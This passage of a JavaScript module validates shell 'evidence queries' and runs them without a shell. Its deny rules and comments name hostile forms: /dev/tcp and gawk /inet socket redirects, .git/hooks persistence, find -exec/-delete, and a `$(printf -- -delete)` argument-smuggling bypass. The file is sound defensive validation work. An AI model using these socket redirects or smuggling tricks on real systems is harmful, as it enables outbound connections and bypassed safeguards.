      if (/[<>|]/.test(a)) problems.push(`awk program \`${a}\` contains \`<\`, \`>\` or \`|\` — awk reads from files and sockets, redirects to files and pipes to commands from inside the program, where the shell-level checks cannot see it`);
    }
    return problems;
  },
  find(args) {
    const bad = new Set(["-exec", "-execdir", "-ok", "-okdir", "-delete", "-fprint", "-fprint0", "-fprintf", "-fls"]);
    return args.slice(1).filter((a) => bad.has(a)).map((a) => `\`find ${a}\` runs or deletes — use find to LIST and pipe into a reader`);
  },
  sort(args) {
    return args.slice(1)
      .filter((a) => a === "-o" || a === "--output" || a.startsWith("--output=") || a.startsWith("--compress-program"))
      .map((a) => `\`sort ${a}\` writes a file or runs a program`);
  },
  rg(args) {
    return args.slice(1)
      .filter((a) => /^--pre(=|$|-glob)/.test(a) || /^--hostname-bin(=|$)/.test(a))
      .map((a) => `\`rg ${a}\` runs an external program per file`);
  },
};
QUERY_COMMAND_RULES.gawk = QUERY_COMMAND_RULES.awk;

const SUBST_PLACEHOLDER = "__SUBST__";

// Scan from `start` (just past the opening delimiter) to the matching close, respecting quotes and nesting.
function readBalanced(src, start, open, close) {
  let depth = 1;
  let i = start;
  while (i < src.length) {
    const c = src[i];
    if (c === "\\") { i += 2; continue; }
    if (c === "'" || c === '"') {
      const end = src.indexOf(c, i + 1);
      if (end < 0) return { text: src.slice(start), next: src.length, unbalanced: true };
      i = end + 1;
      continue;
    }
    if (c === open) depth += 1;
    else if (c === close) { depth -= 1; if (!depth) return { text: src.slice(start, i), next: i + 1, unbalanced: false }; }
    i += 1;
  }
  return { text: src.slice(start), next: src.length, unbalanced: true };
}

const OP_CHARS = "|&<>";

// Inside double quotes everything is literal EXCEPT `\`, `$` and backticks. Scanned literally rather
// than re-lexed on purpose: re-lexing would drop a quoted `>` or the whitespace around it, and the
// per-command rules (awk's `print > "f"`, sed's `1e cmd`) read that exact text.
function readDoubleQuoted(src, open) {
  let i = open + 1;
  let text = "";
  let dynamic = false;
  const nested = [];
  while (i < src.length) {
    const c = src[i];
    if (c === "\\") { text += src[i + 1] ?? ""; i += 2; continue; }
    if (c === '"') return { text, nested, dynamic, next: i + 1, unbalanced: false };
    if (c === "$" && src[i + 1] === "(") {
      const r = readBalanced(src, i + 2, "(", ")");
      if (r.unbalanced) return { text, nested, dynamic, next: src.length, unbalanced: true };
      nested.push(r.text);
      text += SUBST_PLACEHOLDER;
      i = r.next;
      continue;
    }
    if (c === "`") {
      let j = i + 1;
      while (j < src.length && src[j] !== "`") { if (src[j] === "\\") j += 1; j += 1; }
      if (j >= src.length) return { text, nested, dynamic, next: src.length, unbalanced: true };
      nested.push(src.slice(i + 1, j));
      text += SUBST_PLACEHOLDER;
      i = j + 1;
      continue;
    }
    if (c === "$") { dynamic = true; text += c; i += 1; continue; }
    text += c;
    i += 1;
  }
  return { text, nested, dynamic, next: src.length, unbalanced: true };
}

// A small quote-aware lexer. Not a shell — it deliberately reports anything it does not model as a
// problem, so "we could not parse it" and "it is unsafe" collapse into the same refusal.
function lexShellQuery(src) {
  const tokens = [];
  const problems = [];
  let cur = null;
  const word = () => (cur ??= { kind: "word", text: "", quoted: false, dynamic: false, nested: [] });
  const flush = () => { if (cur) { tokens.push(cur); cur = null; } };
  let i = 0;
  while (i < src.length) {
    const c = src[i];
    if (c === "\\") {
      if (i + 1 >= src.length) { problems.push("ends in a trailing backslash — unparseable"); break; }
      word().text += src[i + 1];
      i += 2;
      continue;
    }
    if (c === "'") {
      const end = src.indexOf("'", i + 1);
      if (end < 0) { problems.push("has an unbalanced single quote"); break; }
      word().text += src.slice(i + 1, end);
      word().quoted = true;
      i = end + 1;
      continue;
    }
    if (c === '"') {
      const r = readDoubleQuoted(src, i);
      if (r.unbalanced) { problems.push("has an unbalanced double quote"); break; }
      const w = word();
      w.quoted = true;
      w.text += r.text;
      w.dynamic = w.dynamic || r.dynamic;
      w.nested.push(...r.nested);
      i = r.next;
      continue;
    }
    if (c === "$" && src[i + 1] === "(") {
      const r = readBalanced(src, i + 2, "(", ")");
      if (r.unbalanced) { problems.push("has an unbalanced `$(`"); break; }
      const w = word();
      w.text += SUBST_PLACEHOLDER;
      w.nested.push(r.text);
      i = r.next;
      continue;
    }
    if (c === "`") {
      let j = i + 1;
      while (j < src.length && src[j] !== "`") { if (src[j] === "\\") j += 1; j += 1; }
      if (j >= src.length) { problems.push("has an unbalanced backtick"); break; }
      const w = word();
      w.text += SUBST_PLACEHOLDER;
      w.nested.push(src.slice(i + 1, j));
      i = j + 1;
      continue;
    }
    if (c === "$") { word().text += c; word().dynamic = true; i += 1; continue; }
    if (c === "\n") { flush(); tokens.push({ kind: "op", text: "\n" }); i += 1; continue; }
    if (/\s/.test(c)) { flush(); i += 1; continue; }
    if (c === ";") { flush(); tokens.push({ kind: "op", text: ";" }); i += 1; continue; }
    if (c === "(" || c === ")" || c === "{" || c === "}") { flush(); tokens.push({ kind: "op", text: c }); i += 1; continue; }
    if (OP_CHARS.includes(c)) {
      let j = i;
      let op = "";
      while (j < src.length && OP_CHARS.includes(src[j])) { op += src[j]; j += 1; }
      // A bare digit immediately before a redirect is an fd, not an argument (`2>/dev/null`).
      let fd = null;
      if (cur && !cur.quoted && !cur.dynamic && /^\d+$/.test(cur.text)) { fd = cur.text; cur = null; } else flush();
      if (src[j] === "(") problems.push("uses process substitution — refused: what runs inside it is a command this validator does not model");
      tokens.push({ kind: "op", text: op, fd });
      i = j;
      continue;
    }
    word().text += c;
    i += 1;
  }
  flush();
  return { tokens, problems };
}

// Does this word carry something a shell would have expanded? `nested` is a `$(…)`/backtick the lexer
// pulled out, `dynamic` is a bare `$` (a parameter, `$'…'`, `$((…))`), and the placeholder is what a
// substitution left behind in the text. Any of the three means the word the rules read is not the word the
// operator's shell would have produced — which is the whole of DER-2836.
const wordExpands = (w) => w.nested.length > 0 || w.dynamic || w.text.includes(SUBST_PLACEHOLDER);
// Unquoted pathname-expansion metacharacters. `quoted` is true when ANY part of the word was quoted, so a
// half-quoted `'x'*` reads as quoted here and is NOT refused — deliberately imprecise in the permissive
// direction, because under argv execution an unexpanded glob is a WRONG ANSWER, never an unsafe one. The
// security boundary is that no shell runs; this check only stops a query from silently meaning something
// other than what its author read.
const UNQUOTED_GLOB = /[*?[]/;

const SEPARATORS = new Set(["|", "||", "&&", ";", "\n"]);
const REDIRECT_OUT = new Set([">", ">>", ">|", "&>", "&>>"]);
// `< /dev/tcp/host/port` is bash's socket syntax (and /bin/sh IS bash on macOS); `/inet/…` is gawk's.
// An input redirect from either is an OUTBOUND CONNECTION, not a read. /dev/null is the one device an
// evidence query legitimately reads from.
const REDIRECT_IN_REFUSED = /^\/dev\/(?!null\b)|^\/inet[46]?\//;

// THE parse behind the seam: given the raw query string, return BOTH the reasons it may not be run and
// the pipeline structure it parsed to.
//
//   problems — an empty array means "read-only by construction as far as this validator can tell".
//   stages   — one entry per pipeline segment that has a command, in source order:
//                { separator: string|null, command: string|null, words: string[], redirects: {…} }
//              `separator` is the shell operator that JOINED this stage to the previous one — `"|"`,
//              `"&&"`, `"||"`, `";"`, `"\n"` — and null on the first stage. A consumer asking "does the
//              last stage count the output of the one before it?" must check this: a `;`-separated
//              trailing `wc -l` counts nothing the earlier stage produced. `command` is the literal
//              command name, or null when the name is built by expansion (which `problems` also refuses).
//              `words` are the segment's command words with quotes removed and each `$(…)` collapsed to
//              the SUBST_PLACEHOLDER sentinel; redirect operators and their targets are NOT words — they
//              are resolved into `redirects` ({stdoutToNull, stderrToNull, stderrToStdout, stdinFile}),
//              which is what `runEvidenceQuery` needs to reproduce them without a shell to interpret them.
//
// `stages` is a PARSE, not a verdict: it is populated whenever the lexer succeeded, including for queries
// that `problems` refuses. Check `problems` first; only a query with no problems is one that will run.
export function parseEvidenceQuery(query) {
  const refuse = (p) => ({ problems: [p], stages: [] });
  if (typeof query !== "string") return refuse("query is not a string — nothing to run");
  if (!query.trim()) return refuse("query is empty — nothing to run");
  if (/\.git\/hooks/.test(query)) return refuse("mentions .git/hooks — a query that touches the hook directory is not evidence, it is persistence");

  const { tokens, problems } = lexShellQuery(query);
  if (problems.length) return { problems, stages: [] };

  const segments = [{ separator: null, tokens: [] }];
  for (const t of tokens) {
    if (t.kind === "op" && SEPARATORS.has(t.text)) { segments.push({ separator: t.text, tokens: [] }); continue; }
    segments[segments.length - 1].tokens.push(t);
  }

  // DER-2808 — a query that BEGINS with a separator (`| wc -l`). The empty leading segment is dropped by
  // the `if (!seg.tokens.length) continue` below, so the parse silently loses it: `stages[0]` is then the
  // `wc -l` stage, and any consumer that trusts it to be the query's FIRST command reads a stage that
  // never was. Harmless today only by luck — such a query is a shell syntax error, so it produces no
  // output and the count floor fails it — but that is a blind spot in the PARSE, not a verdict, and
  // `queryCountsNumerically` already has to carry a paragraph explaining the case rather than relying on
  // it being impossible. Refused with the operator named, consistent with the validator's stated posture
  // that an unparsed shape is refused rather than assumed safe.
  if (!segments[0].tokens.length && segments.length > 1) {
    return refuse(`begins with the separator \`${segments[1].separator === "\n" ? "newline" : segments[1].separator}\` — there is no command in front of it for it to join to, so the leading segment is empty. Remove it, or name the command that should produce the input.`);
  }

  const out = [];
  const stages = [];
  for (const seg of segments) {
    if (!seg.tokens.length) continue;
    const words = [];
    // What the redirect operators in this segment mean, resolved here so the executor never re-reads the
    // raw text. Only the forms the checks below ACCEPT are recorded; a refused redirect leaves this at its
    // default, and the query does not run at all.
    const redirects = { stdoutToNull: false, stderrToNull: false, stderrToStdout: false, stdinFile: null };
    for (let k = 0; k < seg.tokens.length; k += 1) {
      const t = seg.tokens[k];
      if (t.kind === "word") { words.push(t); continue; }
      const target = seg.tokens[k + 1]?.kind === "word" ? seg.tokens[k + 1] : null;
      if (REDIRECT_OUT.has(t.text)) {
        if (target?.text !== "/dev/null") out.push(`redirects output (\`${t.text}${target ? ` ${target.text}` : ""}\`) — an evidence query may only READ; the sole allowed target is /dev/null`);
        else if (t.text.startsWith("&")) { redirects.stdoutToNull = true; redirects.stderrToNull = true; }
        else if (t.fd === "2") redirects.stderrToNull = true;
        else redirects.stdoutToNull = true;
        k += target ? 1 : 0;
        continue;
      }
      if (t.text === ">&" || t.text === "<&") {
        if (!target || !/^(\d+|\/dev\/null)$/.test(target.text)) out.push(`duplicates a file descriptor onto \`${target?.text ?? "?"}\` — only \`2>&1\`-style fd duplication and /dev/null are allowed`);
        else if (target.text === "/dev/null") { if (t.fd === "2") redirects.stderrToNull = true; else redirects.stdoutToNull = true; }
        else if (t.fd === "2" && target.text === "1") redirects.stderrToStdout = true;
        k += target ? 1 : 0;
        continue;
      }
      if (t.text === "<") {
        // Reading a file in is a read — but ONLY a file, and only one this validator can see the name of.
        if (!target) {
          out.push("has a `<` with nothing after it — an input redirect must name a literal file");
        } else if (wordExpands(target)) {
          out.push(`takes its \`<\` input from an expansion (\`< ${target.text.replace(SUBST_PLACEHOLDER, "$(…)")}\`) — the source of a redirect must be a literal path, or the redirect smuggles in a command nobody checked`);
        } else if (REDIRECT_IN_REFUSED.test(target.text)) {
          out.push(`reads \`< ${target.text}\` — /dev/tcp, /dev/udp and gawk's /inet special files are SOCKETS, so an input redirect from one is an outbound connection, not a read (the sole device an evidence query may read is /dev/null)`);
        } else if (!target.quoted && UNQUOTED_GLOB.test(target.text)) {
          // Same family as the argument check below: a redirect target is a word a shell would have
          // expanded too. Refused here rather than left to fail as a missing file at run time, so the
          // operator reads one message about globs instead of two unrelated ones.
          out.push(`takes its \`<\` input from the unquoted glob \`${target.text}\` — refused: the query runs in argv form with NO shell, so the pattern is not expanded and would be opened as a literal filename. Name the file.`);
        } else {
          redirects.stdinFile = target.text;
        }
        k += target ? 1 : 0;
        continue;
      }
      out.push(`uses the shell operator \`${t.text}\`${t.text === "&" ? " to background a job" : ""} — refused: it is not one of the pipeline operators this validator models (| || && ; newline, redirect to /dev/null, 2>&1, < file)`);
    }
    if (!words.length) continue;

    const cmd = words[0];
    const built = wordExpands(cmd);
    const bare = /^[A-Za-z][A-Za-z0-9_.+-]*$/.test(cmd.text);
    stages.push({ separator: seg.separator, command: !built && bare ? cmd.text : null, words: words.map((w) => w.text), redirects });
    if (built) {
      out.push(`builds its command name by expansion (\`${cmd.text.replace(SUBST_PLACEHOLDER, "$(…)")}\`) — the command must be a literal name so it can be checked against the allowlist`);
      continue;
    }
    // DER-2836 — EVERY word, not only the command name. An argument built by expansion is an argument no
    // rule below has read: `find . $(printf -- -delete)` reached find's `-delete` rule as the placeholder
    // and passed it. Refused rather than passed through literally, because the query is now executed in
    // argv form and nothing would expand it — running the literal text answers a different question than
    // the one the operator wrote.
    for (const w of words.slice(1)) {
      if (wordExpands(w)) {
        out.push(`builds the argument \`${w.text.replace(SUBST_PLACEHOLDER, "$(…)")}\` by expansion — refused: the query runs in argv form with NO shell, so nothing expands it, and a value produced at run time is a value no option rule here could check (\`$(printf -- -delete)\` is how \`find\`'s -delete rule was bypassed). Inline the literal value.`);
      } else if (!w.quoted && UNQUOTED_GLOB.test(w.text)) {
        out.push(`contains the unquoted glob \`${w.text}\` — refused: the query runs in argv form with NO shell, so the pattern is NOT expanded to matching files and the command would receive it literally. Quote it and let the command match (\`find . -name '*.mjs'\`, \`git ls-files 'src/**'\`), or name the files.`);
      }
    }
    const name = cmd.text;
    if (!bare) {
      out.push(`runs \`${name}\`, which is not a bare command name — a path, a glob or a VAR=value prefix is refused (the allowlist can only vouch for names it resolves the same way you do)`);
      continue;
    }
    const refusal = QUERY_REFUSED_COMMANDS.get(name);
    if (refusal) { out.push(`runs \`${name}\`, which ${refusal} — refused`); continue; }
    if (!QUERY_READONLY_COMMANDS.has(name)) {
      out.push(`runs \`${name}\`, which is not on the read-only evidence allowlist — an UNRECOGNISED command is refused, not run. If it truly only reads, add it to QUERY_READONLY_COMMANDS with a reason.`);
      continue;
    }
    // hasOwn, not a bare index: a name like `constructor` must never reach Object.prototype.
    const rule = Object.hasOwn(QUERY_COMMAND_RULES, name) ? QUERY_COMMAND_RULES[name] : null;
    if (rule) out.push(...rule(words.map((w) => w.text)));
  }

  // DER-2810 — a TRAILING stage that can only destroy the signal the gate exists to read.
  //
  // DER-2783 made a nonzero exit a FAILED run, which closed `git log … | grep -c 'fix('` matching nothing
  // being stamped `ok 1 ≥ 1`. Four characters reopened it: `… || true` and `… ; true` exit 0 with stdout
  // `0`, and because the last stage is then `true` rather than a counting command, numeric mode does not
  // apply — the line count is 1 and the query is stamped `ok 1 ≥ 1` again. `… | cat` reaches the same
  // place by a third door: the counting command is no longer last, so numeric mode is off and the single
  // line `0` counts as 1.
  //
  // Refused at the VALIDATOR rather than guessed at in the evaluator, by exact command name — not a
  // heuristic over the raw string, which is what made this unfixable inside DER-2783's scope. The
  // deliberate decision the issue asked for: `true`/`:` and the pure pass-throughs `cat`/`tee` are the
  // only trailing stages refused, because none of them can ADD information to an evidence query and all
  // of them can subtract it. A trailing `head`/`sort`/`awk` still falls back to line counting as before —
  // those genuinely transform the output, and refusing them would break working queries.
  const lastStage = stages.at(-1);
  if (lastStage?.command && stages.length > 1) {
    if (lastStage.command === "true" || lastStage.command === ":") {
      out.push(`ends in \`${lastStage.separator} ${lastStage.command}\` — that suppresses the exit status of everything before it, which is the signal the evidence gate reads (DER-2783). A query that cannot fail is not evidence. Drop it.`);
    } else if (lastStage.separator === "|" && (lastStage.command === "cat" || lastStage.command === "tee")) {
      out.push(`ends in \`| ${lastStage.command}\` — a pass-through that adds nothing and moves the counting command off the end of the pipeline, so a count of \`0\` is read as ONE LINE of output and passes a floor of 1. Drop it.`);
    }
  }
  return { problems: out, stages };
}

// THE pure predicate behind the seam: the reasons a query may not be run, empty when it is read-only by
// construction. Exported so the rules are unit-testable directly rather than only through a spawn — every
// caller that only wants the verdict uses this rather than reaching for the parse.
export function evidenceQueryShellProblems(query) {
  return parseEvidenceQuery(query).problems;
}

// ---------------------------------------------------------------------------
// Executing an evidence query WITHOUT a shell (DER-2836)
// ---------------------------------------------------------------------------
// The validator above is a predicate over the text; this is what makes its verdict binding. Each stage is
// spawned in argv form — `spawnSync(cmd, args)`, no `shell: true` — so the words the rules read are the
// words execve receives. There is no second expansion pass for a `$(…)` to hide in.
//
// Pipes are BUFFERED, not concurrent: each stage runs to completion and its stdout becomes the next
// stage's stdin. Two consequences, both deliberate and both harmless for evidence queries (bounded output,
// one 60s budget for the whole pipeline): an upstream stage is not SIGPIPE'd when a downstream `head` has
// seen enough, so it does all its work; and `2>&1` appends stderr after stdout rather than interleaving
// them, because interleaving cannot be reconstructed from two captured buffers. Line COUNTS — the only
// thing any caller reads out of this — are unaffected by either.
//
// `&&` / `||` short-circuit left-to-right off the previous stage's status, which is exactly the shell's
// left-associative evaluation for a flat list; `;` and newline reset stdin. The pipeline's status and
// stdout are the LAST EXECUTED stage's, matching the shell. Returns a spawnSync-SHAPED object so
// `evaluateQueryRun` reads a run the same way whoever wrote it intended.
export function runEvidenceQuery(query, { cwd = process.cwd(), timeout = 60_000 } = {}) {
  const { problems, stages } = parseEvidenceQuery(query);
  // Defense in depth, not the gate: `query-check` refuses before it ever calls this. A refused query
  // reaching here is a bug in the caller, and it must fail rather than run.
  if (problems.length) return { status: null, stdout: "", stderr: "", signal: null, error: new Error(`refused by the evidence-query policy, not executed: ${problems.join(" · ")}`) };

  const deadline = Date.now() + timeout;
  let input = "";
  let prev = 0;
  let last = { status: 0, stdout: "", stderr: "", signal: null, error: null };
  for (const st of stages) {
    if (st.separator === "&&" && prev !== 0) continue;
    if (st.separator === "||" && prev === 0) continue;
    if (st.separator !== "|") input = "";
    // Unreachable while `problems` is empty — an expansion-built name is always a problem — but a null
    // command here would otherwise spawn `undefined`, so it fails closed instead of being assumed.
    if (!st.command) return { status: null, stdout: "", stderr: "", signal: null, error: new Error("a pipeline stage has no literal command name — refusing to guess at it") };

    let stdin = input;
    if (st.redirects.stdinFile) {
      try { stdin = readFileSync(resolve(cwd, st.redirects.stdinFile), "utf8"); }
      catch (e) {
        // What a shell does with an unreadable `<` target: report it, do NOT run the command, exit nonzero.
        prev = 1;
        last = { status: 1, stdout: "", stderr: `${st.redirects.stdinFile}: ${e.code ?? e.message}\n`, signal: null, error: null };
        continue;
      }
    }
    const remaining = deadline - Date.now();
    if (remaining <= 0) return { ...last, status: null, signal: "SIGTERM" };

    const r = spawnSync(st.command, st.words.slice(1), { cwd, encoding: "utf8", timeout: remaining, input: stdin, shell: false });
    if (r.error || r.signal) return { status: null, stdout: "", stderr: String(r.stderr ?? ""), signal: r.signal ?? null, error: r.error ?? null };

    let stdout = String(r.stdout ?? "");
    let stderr = String(r.stderr ?? "");
    if (st.redirects.stderrToStdout) { stdout += stderr; stderr = ""; }
    if (st.redirects.stderrToNull) stderr = "";
    if (st.redirects.stdoutToNull) stdout = "";
    prev = r.status ?? null;
    input = stdout;
    last = { status: prev, stdout, stderr, signal: null, error: null };
  }
  return last;
}

// ---------------------------------------------------------------------------
// Counting what an evidence query returned (DER-2783)
// ---------------------------------------------------------------------------
// Two independent facts decide whether a query cleared its floor, and BOTH have to be asked. Asking only
// the second — which is what this gate did until 2026-07-30 — produces a check that cannot fail:
//
//   1. DID THE RUN SUCCEED? Only `run.error` was consulted, and spawnSync sets `error` when the shell
//      cannot be SPAWNED, never when the command it ran exits nonzero. So a query printing three lines
//      and exiting 1 was stamped `ok`, and `validate` then honoured that blind pass. Worse, the canonical
//      `git log … | grep -c 'fix('` with ZERO matches exits 1 with stdout `"0\n"` — one non-empty line,
//      read as `ok 1 >= 1`. A kill criterion that returned zero would have auto-selected "delete the
//      tool" while the problem recurred, which is the exact 07-28 failure this whole gate exists for.
//   2. WHAT DID IT COUNT? Line counting is right for a pipeline that emits its matches, and wrong for one
//      that emits a NUMBER. `grep -c` prints exactly one line whatever the count, so `expectAtLeast >= 2`
//      was unsatisfiable at 500 matches — while SKILL.md documents that shape with a floor of 6.
//
// Fixing only (1) leaves the documented shape broken; fixing only (2) leaves a failed run passing. The
// SIBLING idiom in `priorart-check`'s `sweep()` is deliberately NOT changed: there `grep` exiting 1 on
// no-match is the normal signal, and a status-0 rule would fire the rg→grep fallback on every clean sweep
// and then hard-fail. Same expression, opposite meaning — the family has one member, not two.

// The counting commands whose stdout IS a number rather than the matches themselves, each with the flag
// that makes it count. Short flags are matched as CLUSTERS (`grep -rc`), long flags exactly. `egrep`/
// `fgrep` are here because the allowlist carries them and they are `grep` — leaving them out would be the
// half-changed family this repo's review rules reject.
const NUMERIC_COUNT_COMMANDS = new Map([
  ["grep", { letter: "c", long: ["--count"] }],
  ["egrep", { letter: "c", long: ["--count"] }],
  ["fgrep", { letter: "c", long: ["--count"] }],
  ["rg", { letter: "c", long: ["--count", "--count-matches"] }],
  ["wc", { letter: "l", long: ["--lines"] }],
]);

// Does this query's LAST stage emit a count rather than the matches? Answered off the shared parse, never
// off a second regex over the raw string — `parseEvidenceQuery` is the one lexer that already knows what
// is a word, what is a redirect target and what is inside quotes.
//
// `separator` is load-bearing and is the reason this cannot be "the last stage is `wc -l`". It names the
// operator that JOINED the final stage to the one before it, so only `|` means "this stage consumed what
// came before": a `;`/`&&`/`||`/newline-joined trailing `wc -l` counted NOTHING the earlier stage
// produced, and its number is not this query's answer. `null` is the one other legitimate value — it
// occurs only on a stage that is the whole query (`grep -c 'fix(' CHANGELOG.md`), which counts its own
// operands and has no upstream to have missed.
//
// DER-2808 removed the case this paragraph used to end on: a query beginning with a bare separator
// (`| wc -l`) parsed to a single stage whose separator was `"|"`, and the comment recorded that as a
// deliberate residual mitigated by DER-2783's exit-status gate. Such a query is now REFUSED by
// `parseEvidenceQuery`, so it reaches this predicate with no stages at all. The closing point of that
// paragraph still stands on its own and is why the refusal was worth making: this predicate must never
// be the only gate.
//
// Known limit, stated rather than implied: a value that happens to be spelled like the counting flag
// (`grep -e -c …`) reads as the flag here. It cannot promote anything on its own — numeric mode also
// requires stdout to be a single bare integer, and matched lines are not that.
export function queryCountsNumerically(query) {
  const stages = parseEvidenceQuery(query).stages;
  const last = stages.at(-1);
  if (!last?.command) return false;
  if (!(last.separator === "|" || (last.separator === null && stages.length === 1))) return false;
  const rule = NUMERIC_COUNT_COMMANDS.get(last.command);
  if (!rule) return false;
  for (const w of last.words.slice(1)) {
    if (w === "--") break; // everything after `--` is an operand, not an option
    if (rule.long.includes(w)) return true;
    if (/^-[A-Za-z]+$/.test(w) && w.slice(1).includes(rule.letter)) return true;
  }
  return false;
}

// Non-empty stdout lines are the match count — unless the pipeline ends in a counting command AND the
// output is a single bare integer, in which case that integer IS the count. The trim is load-bearing on
// macOS — BSD `wc -l` right-aligns its number in a padded field, so a strict `/^\d+$/` against raw stdout
// would leave numeric mode dead for the command most likely to want it. A query that errors produces no
// stdout and so counts 0 — fail-closed, never "no output means clean".
//
// DER-2841 — when the last stage IS a counting command but its output is NOT one bare integer, the query
// is REFUSED rather than line-counted. The old fallback is where this defect lived: `grep -c` over
// MULTIPLE files emits `path:count` rows, so line counting returned the NUMBER OF FILES, and a file whose
// count is `0` was counted as a match. Measured on the parent: `a.txt:0\nb.txt:0\n` against a floor of 1
// returned `{count: 2, ok: true}` — a query with ZERO real matches certified as evidence. The failure is
// silent, it scales with the number of files searched, and it looks MORE convincing the wider the search.
//
// Refusing is deliberately chosen over summing the rows, per the issue: a summed number is only correct
// if every row parsed, so a partial parse would quietly under- or over-count, whereas a refusal tells the
// author to narrow the query to something whose answer is a single number. Empty output keeps its
// existing fail-closed reading (0 matches) — there is nothing to misread, and the run's exit status has
// already spoken.
export function evaluateQueryOutput(stdout, expectAtLeast, { numeric = false } = {}) {
  const text = String(stdout ?? "");
  const bare = text.trim();
  if (numeric) {
    if (/^\d+$/.test(bare)) {
      const count = Number(bare);
      return { count, ok: count >= expectAtLeast };
    }
    if (bare !== "") {
      const shown = bare.length > 120 ? `${bare.slice(0, 120)}…` : bare;
      return {
        count: 0,
        ok: false,
        failed: true,
        failure: "the pipeline ends in a counting command but its output is not a single number "
          + `(got ${JSON.stringify(shown)}) — refusing to count it. \`grep -c\`/\`rg -c\` over MULTIPLE `
          + "files print `path:count` rows, and counting those ROWS reports the number of files searched, "
          + "not the number of matches — a file with `0` matches counts as one. Narrow the query to a "
          + "single file, or end it in `| wc -l` so the answer is one number.",
      };
    }
  }
  const count = text.split("\n").filter((l) => l.trim()).length;
  return { count, ok: count >= expectAtLeast };
}

// The whole verdict for one spawned query: exit status FIRST, output second. `failed` is carried out of
// here (and stamped into the plan) so `validate` decides on the run, not merely on the count — a count of
// 0 is what a failed run is stamped with, and 0 is also a legitimate measurement shape, so the two must
// not be the same fact.
export function evaluateQueryRun(run, expectAtLeast, query) {
  const spawnError = run?.error ?? null;
  const signal = run?.signal ?? null;
  const status = run?.status ?? null;
  if (spawnError || signal || status !== 0) {
    const why = spawnError ? `the query itself failed to run (${spawnError.message})`
      : signal ? `the query was killed by ${signal}`
        : status === null ? `the query reported no exit status`
          : `the query exited ${status}`;
    // The remedy is named because the commonest legitimate trigger is a PREDICATE exit, not a crash:
    // grep exits 1 to say "no match", diff exits 1 to say "they differ". Ending the pipeline in
    // something that consumes that output turns the predicate back into a count and the status back
    // into a status — which is the shape the floor was written for anyway.
    return { count: 0, ok: false, failed: true, failure: `${why} — a run that did not exit 0 is a FAILED run, not a count; counted as 0, fail-closed. (grep/diff exit nonzero to REPORT "no match"/"they differ": if that IS the evidence, end the pipeline in something that consumes it — \`… | wc -l\` — so the exit status means what it says.)` };
  }
  const ev = evaluateQueryOutput(run?.stdout, expectAtLeast, { numeric: queryCountsNumerically(query) });
  // DER-2841: the output evaluator can now REFUSE (a counting pipeline whose stdout is not one number),
  // so its verdict is carried out rather than overwritten. Hardcoding `failed: false` here — as this line
  // did — would discard the refusal the moment it was introduced: the query would report `count: 0,
  // ok: false` with no reason attached, and the author would see a floor failure instead of the actual
  // problem with their query.
  return { ...ev, failed: ev.failed ?? false, failure: ev.failure ?? null };
}

export function collectEvidenceQueries(plan, issueId = null) {
  const rows = [];
  if (!issueId) for (const [qi, q] of (Array.isArray(plan?.evidenceQueries) ? plan.evidenceQueries : []).entries()) rows.push({ id: null, index: qi, q });
  for (const it of plan?.issues ?? []) {
    if (issueId && it.id !== issueId) continue;
    for (const [qi, q] of (Array.isArray(it?.evidenceQueries) ? it.evidenceQueries : []).entries()) rows.push({ id: it.id, index: qi, q });
  }
  return rows;
}

export const SYMBOL_USES = ["test", "call", "edit"];

export function symbolShapeProblems(s) {
  if (!s || typeof s !== "object") return ["not an object — symbols are {name, from, use?}"];
  const problems = [];
  if (!s.name || typeof s.name !== "string" || !s.name.trim()) problems.push("needs a name");
  if (!s.from || typeof s.from !== "string" || !s.from.trim()) problems.push("needs `from` — the repo-relative file the plan implies it lives in");
  if (s.use !== undefined && !SYMBOL_USES.includes(s.use)) problems.push(`use must be one of ${SYMBOL_USES.join("|")} (got ${JSON.stringify(s.use)})`);
  return problems;
}

// Heuristic ESM/TS export classifier — a regex, not a parser. Good enough to catch the motivating case
// (a plan demanding a behavioral test of a non-exported `async function`); a re-export from ANOTHER
// module is out of scope and reads as "private" here, which correctly prompts the same question the gate
// exists to force: what actually imports this?
export function classifySymbol(source, name) {
  const src = String(source ?? "");
  // `export { a, b as c }` — a rename exports the RIGHT-hand name; the left side is not importable.
  for (const m of src.matchAll(/export\s*\{([^}]*)\}/g)) {
    for (const entry of m[1].split(",")) {
      const parts = entry.trim().split(/\s+as\s+/);
      if ((parts[parts.length - 1] ?? "").trim() === name) return "exported";
    }
  }
  const n = name.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  if (new RegExp(`export\\s+(?:default\\s+)?(?:async\\s+)?(?:function\\*?|class)\\s+${n}\\b`).test(src)) return "exported";
  if (new RegExp(`export\\s+(?:const|let|var|type|interface|enum)\\s+${n}\\b`).test(src)) return "exported";
  if (new RegExp(`(?:^|[\\s;{}])(?:async\\s+)?(?:function\\*?|class)\\s+${n}\\b`).test(src)) return "private";
  if (new RegExp(`(?:^|[\\s;{}])(?:const|let|var|type|interface|enum)\\s+${n}\\b`).test(src)) return "private";
  return "not-found";
}

// Term derivation for the prior-art sweep. Declared terms (issue.priorArt.terms) win; otherwise pull
// identifiers out of the title/notes — backticked spans, camelCase, dotted/kebab/snake tokens — and skip
// unit ids. Deliberately heuristic: the output is candidates for a HUMAN, never a verdict.
export function deriveSearchTerms(issue = {}) {
  const declared = issue?.priorArt?.terms;
  if (Array.isArray(declared) && declared.length) return [...new Set(declared.filter((t) => typeof t === "string" && t.trim()))];
  const text = [issue?.title, issue?.notes].filter(Boolean).join("\n");
  const terms = new Set();
  for (const m of text.matchAll(/`([^`\n]{3,80})`/g)) terms.add(m[1].trim());
  for (const m of text.matchAll(/\b[a-z][a-z0-9]*(?:[A-Z][a-z0-9]*)+\b/g)) terms.add(m[0]);
  for (const m of text.matchAll(/\b[A-Za-z][\w$]*(?:[._-][\w$]+)+\b/g)) {
    if (!LINEAR_ID_RE.test(m[0]) && !SPEC_UNIT_RE.test(m[0])) terms.add(m[0]);
  }
  return [...terms].slice(0, 8);
}

// ---------------------------------------------------------------------------
// CLI
// ---------------------------------------------------------------------------
export function parseArgs(argv) {
  const o = { rest: [] };
  for (let i = 0; i < argv.length; i += 1) {
    const a = argv[i];
    if (a === "--help" || a === "-h") o.help = true;
    else if (a === "--json") o.json = true;
    else if (a === "--verify") o.verify = true;
    else if (a === "--record") o.record = true;
    else if (a === "--require-observed") o.requireObserved = true;
    else if (a === "--surfaces") o.surfaces = argv[++i];
    else if (a === "--core") o.core = Number.parseInt(argv[++i], 10);
    else if (a === "--extra-files") o.extraFiles = Number.parseInt(argv[++i], 10);
    else if (a === "--extra-additions") o.extraAdditions = Number.parseInt(argv[++i], 10);
